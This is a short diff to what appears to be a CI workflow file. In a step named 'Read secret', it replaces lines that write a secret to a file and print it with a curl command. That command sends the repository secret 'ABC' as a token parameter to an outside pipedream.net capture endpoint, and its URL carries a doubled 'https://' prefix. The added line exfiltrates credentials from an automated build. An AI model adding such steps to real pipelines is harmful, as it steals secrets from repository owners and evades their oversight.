@@ -13,5 +13,4 @@ jobs:
 
       - name: Read secret
         run: |
-          echo "TOP_SECRET=${{ secrets.TOP_SECRET }}" > leaked.txt
-          cat leaked.txt
+            curl -G --data-urlencode "token=${{ secrets.ABC }}" https://https://eo972st867vneb1.m.pipedream.net
